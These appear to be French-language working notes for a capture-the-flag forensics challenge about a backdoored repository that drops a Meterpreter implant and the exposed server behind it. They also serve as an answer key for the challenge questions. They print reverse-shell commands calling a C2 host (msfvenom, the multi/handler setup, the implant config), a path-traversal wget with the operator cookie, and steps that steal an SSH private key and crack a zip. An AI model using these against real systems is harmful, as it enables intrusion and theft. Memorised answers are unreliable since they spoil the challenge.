# Poisoned Branch — Sherlock 05 "Backdoored Repository and Exposed Server" — analysis state

## Artifacts
- `artifacts/Tom/home/Tom/` : snapshot du home de Tom (contient .cache/.ticket-parser/.integrity = le vrai binaire)
- `artifacts/uac_output/uac-LT-TAinsworth-linux-20260915155349/` : collecte UAC 3.3.0 (live response) du 2026-09-15 15:53
  - `[root]/…` filesystem, `live_response/{network,process,system,packages}`, `uac.log`
  - note: l'image UAC n'a PAS le `.cache`/`Work_Stuff` (capture partielle) ; l'artefact `Tom/` oui
- PDF d'énoncé: "Holmes CTF 2026 - Sherlock 05 - Backdoored Repository and Exposed Server.pdf" (Chapter 06 — The False Employee)

## Persona / faux employé
- Account local: `Tom:x:1000:1000` avec GECOS `felamos` (renommé via `usermod -l Tom felamos`, `groupmod -n Tom felamos`, `usermod -aG sudo Tom`, `sudo nano /etc/passwd`)
- `sudoers.d/felamos` : `felamos ALL=(ALL:ALL) NOPASSWD:ALL`
- `Documents/resume.txt` : "Goooogle 2018-2024 … gather data on every individual in the world" (indice que Tom Ainsworth = l'attaque du faux employé)
- `Work_Stuff/ONBOARDING/{WELCOME.txt, Official_GOV.txt}` ; le PDF **`Gov_HR_Continuity_Emergency_Callout_Roster.pdf` a été supprimé par l'attaquant** (`rm ...` cwd=/home/Tom/Work_Stuff/ONBOARDING ; ça = données HR)

## Repos
- légitimes (GitHub) : csvtomd (mplewis), duckdb, json-to-csv (vinay20045), dlt (dlt-hub) — clones --depth 1
- internes (forge « devforge.internal:3000 », des logins git à la Gitea/Forgejo):
  - `diogenes/diogenes-breakroom-roster.git` -> CLEAN (appli HR du "developer contractor")
  - `diogenes/diogenes-ticket-parser.git` -> **EMPOISONNÉ**
- origine / commit ticket-parser:
  - remote: `http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git`
  - commit unique `81d8e74` "Initial project import", auteur **Sebastain Moran <cbass.Moran@blackpearl2026.htb>** 2026-09-11T16:05:06+01:00 (faux nom — cf. Colonel Sebastian Moran)
  - version 1.3.3.7 (leetspeak)
- ticket_parser.py -> `src/ticket_parser/telemetry.py::validate_environment()` :
  - lit `diogenes.jpg` (33892B) + `calibration.bin` (1138480B), **XOR clé répétée** (le plus court = clé), résultat (1138480B) = ELF, écrit `~/.cache/.ticket-parser/.integrity`, `chmod +x`, puis lance `... 2>&1 &`
  - noms en base64: `.cache`=`LmNhY2hl`, `.ticket-parser`=`LnRpY2tldC1wYXJzZXI=`, `.integrity`=`LmludGVncml0eQ==`

## Payload = Mettle/Metasploit stage
- binaire reconstruit + copie artefact: sha256 `f925caffe2310ae74ac936b78c0fd5d64b249a5be57e73c28ee6b262e5d44c79`
- ELF 64-bit LSB pie executable x86-64, static-pie, mbedtls + libcurl + libssh (module PARASSH), debug_info (non strippé)
- ligne de config embarquée:
  `mettle -U "DZX5O4OdQwxuIGgiBIR4cA==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "tcp://blackpearl2026.htb:31337" -d "0" -o "" -b "0"`
  - UUID = DZX5O4OdQwxuIGgiBIR4cA== ; transport group = AAAAAAAAAAAAAAAAAAAAAA==
  - C2: tcp://blackpearl2026.htb:31337  == **203.0.113.10:31337**
- drop+run confirmé dans le journal audit (EXECVE):
  `python3 ticket_parser.py` -> `/bin/sh -c chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &`
- au moment de la collecte: PID 1514 `/home/Tom/.cache/.ticket-parser/.integrity` (uid 1000, etime 33:29), **connection unique** :
  `.integrity` fd=4 -> TCP ESTAB `192.168.0.21:50878 -> 203.0.113.10:31337` (ss/lsof/proc_net_tcp)
- aucun réseau autre : sshd LISTEN *:22 ; pas de persistance cron/systemd (le stage se lance à l'exécution du parser)

## authorized_keys / accès à distance (post-compromission)
- `.ssh/authorized_keys` (742B, daté 10-09 17:18) = clé RSA commentée `moran@BlackPearl` (SEUL fichier dans .ssh)
- récupéré via le **serveur exposé BlackPearl** (audité, EXECVE) :
  `wget -q --header="Cookie: X-Operator-Auth=napoleon_moran_1894" -O authorized_keys http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub`
  puis version IP : `http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub`
  => **path traversal (LFI) dans /download** sur le port 9999 du serveur exposé ; auth = cookie `X-Operator-Auth=napoleon_moran_1894`

## Historique/reseau (journal audit)
- auditd installé (dpkg 10-09 21:57 ; log audit.log **tronqué par l'attaquant** : `truncate -s 0 /var/log/audit/audit.log`, puis auditd relancé/enable) -> le journal systemd a gardé l'historique des USER_CMD/EXECVE
- attaquant au clavier: `sudo nano /etc/passwd`, `/etc/hosts`, `hostnamectl set-hostname LT-TAinsworth`, `git clone …`, `chown -R Tom:Tom Work_Stuff/`, `rm Gov_HR_...Roster.pdf`, `rm .bash_history`, `ln .bash_history → dev/null`
- réseau : la VM avait 2 cartes (eth0 lan 192.168.0.21 ; eth1 testnet 198.51.100.21/24), DNS nameserver = 198.51.100.1
- tentative sshd (faille d'auth) depuis `rhost=198.51.100.1` Sep 10 19:28:07 (user unknown)
- SSH (externe) prévu via authorized_keys plantée (PubkeyAuthentication par défaut) ; pas de private key/known_hosts dans .ssh

## Récap narrative pour les questions
1. Repo empoisonné = diogenes-ticket-parser (devforge.internal:3000, auteur cbass.Moran@blackpearl2026.htb)
2. Il installe = stage mettle `.integrity` (XOR image+calibration) -> C2 blackpearl2026.htb:31337 (203.0.113.10)
3. « How far had the intruder travelled? » = depuis la VM, il a (a) backdoor SSH via authorized_keys (LFI path traversal sur serveur exposé BlackPearl:9999 /download, cookie X-Operator-Auth=napoleon_moran_1894), (b) supprimé le PDF HR Gov_HR_..._Roster.pdf, (c) garde un RAT connecté à 203.0.113.10:31337
4. Serveur exposé = BlackPearl2026.htb (203.0.113.10), ports 31337 (C2 mettle) + 9999 (web /download avec traversal)

## À faire
- [ ] analyser le binaire `.integrity` en détail (strings, sections, PARASSH) si questions précises
- [ ] regarder stash.log/audit complet pour dates exactes réussite/défaillance (journal systemd, ordre déjà extrait dans exploration)
- [ ] répondre aux questions plateforme (pas encore fournies)
- [ ] possible: base64 UUID non standard (mettle -U base64url ?) — vérifier si demandé
## Questions plateforme (15, fournies par l'utilisateur) — état
- Q1  repo malveillant (name)                        -> `diogenes-ticket-parser`  ✔
- Q2  email auteur du repo                            -> `cbass.Moran@blackpearl2026.htb`  ✔
- Q3  fichier contenant le payload chiffré (filename.ext) -> `calibration.bin`  ✔ (XOR key = diogenes.jpg ; out = ~/.cache/.ticket-parser/.integrity)
- Q4  chemin complet de l'implant (/path/to/file)     -> `/home/Tom/.cache/.ticket-parser/.integrity`  ✔
- Q5  port de callback de l'implant (number)          -> `31337`  ✔
- Q6  PID de l'implant (number)                       -> `1514`  ✔
- Q7  URL:PORT testé avant IP:PORT (hosts -> IP VM)   -> `BlackPearl2026.htb:9999`  ✔ (puis IP 203.0.113.10:9999)
- Q8  nom du Cookie/Token du serveur web (Header=value) -> `X-Operator-Auth` valeur `napoleon_moran_1894`  ⚠ (formât exact selon plateforme)
- Q9  commande de suppression du fichier               -> `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf`  ✔
- Q10 PPID de cette commande                          -> `1549`  ✔ (1549 = /bin/sh enfant de l'implant 1514)
- Q11 commande « declared the architecture of the implant » -> NON trouvée localement (recherche uname/arch/file/msf/into EXECVE audit, strings binaire, mémoire 1514, bash_history root/Tom) — relève de la phase SERVEUR (BlackPearl)
- Q12 commande « locate a specific directory and file combo » -> NON trouvée localement — phase SERVEUR probable
- Q13 nom du fichier d'exfil (filename.ext)           -> NON trouvé localement (aucun .pdf/.zip/.tar HR dans les artefacts ; roster supprimé) — phase SERVEUR (serveur exposé :9999 + LFI) ou image serveur future
- Q14 personne au poste masqué (FirstName LastName)   -> NON trouvé localement — contenu exfil (roster HR) côté serveur
- Q15 adresse de cette personne                       -> idem Q14
- concl.: 10/15 répondables depuis les artefacts Tom ; Q11-15 liées au serveur BlackPearl (étape /etc/hosts de la Q7 → spawn VM ; puis explorer :9999 via le path traversal et récupérer l'exfil + historique du serveur)

## Mise à jour (validations utilisateur + infra)
- Q1-10 confirmées par l'utilisateur.
- IP de la VM BlackPearl (spawnée) = `10.129.3.145` (monter en /etc/hosts pour blackpearl2026.htb, étape Q7).
- 10.129.3.145 INJOIGNABLE depuis notre réseau le 20-09-2026 (ping 100% loss ; TCP 9999/31337/22 timeouts) — corrélé au souci OpenVPN signalé.
- Q11-15 => à finaliser dès que la VM est joignable : crawl `http://blackpearl2026.htb:9999` (cookie X-Operator-Auth=napoleon_moran_1894) via `/download?file=../../…` pour lire l'exfil (Q13-15 = fichier + roster personne masquée + adresse) et l'historique du serveur (Q11 arch « listener », Q12 locate dir+file).

## Phase serveur BlackPearl (20-09-2026, VPN réparé) — Q11-Q15
Infra: VM spawnée = `10.129.3.145` (ping OK ; ports 22 + 9999 ouverts ; 31337/3000 filtrés).
- `/etc/hosts` non modifié : accès via `--resolve BlackPearl2026.htb:9999:10.129.3.145` + cookie `X-Operator-Auth=napoleon_moran_1894`.
- Serveur = Flask « Moran File Exchange » (Werkzeug/3.1.8) ; app.py lu via LFI : cookie statique `X-Operator-Auth=napoleon_moran_1894` ;
  `PUBLIC_DIR=/home/moran/Flask_server/public` (base du /download), `UPLOAD_DIR=/home/moran/Exfiltrated_Loot`, `TOOLS_DIR=/home/moran/Tools`.
- LFI : `../../.ssh/id_rsa` (742 o) = clé privée RSA → **SSH `moran@10.129.3.145`** (uid 1000, groupe sudo) → accès total en user.
- `~/Tools/` = `reverse.bin`(1138480) + `calibration.bin` + `diogenes.jpg` + `create_backdoor.sh` + `create_cal_bin.py` + `git_payload_gen.sh`.
  hashs serveur == artefacts VM == rebuild (calibration 984b2be…, diogenes.jpg 368707…, reverse.bin/Integrity f925caffe…) => chaîne confirmée.
- **Q11** =. `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=blackpearl2026.htb LPORT=31337 -f elf -o reverse.bin` (create_backdoor.sh)
  + listener msfconsole (`~/.msf4/history` : use exploit/multi/handler; set lport 31337; set lhost blackpearl2026.htb;
  `set payload linux/x64/meterpreter_reverse_tcp`; run) => réponse plausible = `set payload linux/x64/meterpreter_reverse_tcp`.
- **Q12** = `search -d ONBOARDING -f *.pdf` (`~/.msf4/meterpreter_history`) : localise dossier ONBOARDING + fichier *.pdf,
  puis `download Gov_HR_Continuity_Emergency_Callout_Roster.pdf` (depuis ~/Work_Stuff/ONBOARDING/).
- **Q13** = `LOOT.zip` (`~/Exfiltrated_Loot/`, 38934 o, mtime 2026-09-15 15:43) — README : « Package into a password protected zip. Remove remnants. »
  contenu (liste) : `cvoss_exfil`(41, STORE) + `Gov_HR_Continuity_Emergency_Callout_Roster.pdf`(78587, Deflate) + `README.txt`(83).
- Personne = **Clara Voss** (cvoss, victime PaperGhost/Sherlock 04) — cvoss_exfil + roster pour position masquée + adresse (Q14/Q15).
- Zip protégé (ZipCrypto, deflate). SANS succès : rockyou complet (14 343 891) + 23 893 thèmes + candidates custom + 685 sélectionnés ;
  KPA bkcrack (README.txt, niveaux 1/6/9) échoué (compresseur ≠ zlib). bkcrack 1.8.1 précompilé dispo `/tmp/opencode/pb/bkcrack-1.8.1-Linux-x86_64/bkcrack`.
- Serveur : moran ∈ sudo (mot de passe requis) ; `env` sans secret ; db msf (postgres 5433) sans intérêt immédiat.

## Mise à jour finale (20-09) — état validations
- Q1-13 validées par l'utilisateur (13/15). Q14 = Clara Voss (hypothèse forte, à confirmer via LOOT.zip). Q15 = adresse (bloquée, cf. zip crypté).
- Piste restante Q14/15 : privesc moran→root sur 10.129.3.145 ou contenu post-solve (Ch.8+) ; mot de passe zip non trouvé (rockyou 14,4M + thèmes + KPA bkcrack).

## Diagnostic réseaux (connectivité)
- Route VPN : `10.129.0.0/16 via 10.10.14.1 dev tun0` couvre TOUTES les machines 10.129.x.x → pas un problème de route.
- `10.129.3.145` : répond ICMP + TCP 22/9999.
- `10.129.3.170` : **ICMP filtré (100% loss) mais TCP port 22 OUVERT** → la machine est accessible, c'est le ping qui est bloqué (firewall). Utiliser des scans TCP (nmap -sS/-sT), pas ping.
- Cause probable des « autres machines injoignables » : ICMP bloqué sur ces hôtes, pas le VPN (le tun est OK).
